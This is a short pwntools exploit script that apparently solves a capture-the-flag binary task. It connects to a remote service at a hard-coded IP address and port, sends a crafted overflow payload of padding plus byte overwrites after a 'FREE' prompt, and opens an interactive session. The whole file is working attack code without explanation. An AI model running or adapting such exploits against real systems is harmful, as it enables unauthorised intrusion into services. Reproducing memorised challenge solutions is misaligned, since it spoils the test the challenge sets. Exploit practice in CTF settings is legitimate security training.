from pwn import *

# p = process("./task5_file")
p = remote("62.173.140.174", 17400)
payload = b"aaaaaaaabaaaa" + p8(0x30) + p8(0x00) + p8(0x1)
p.sendlineafter(b"FREE\n", payload)

p.interactive()
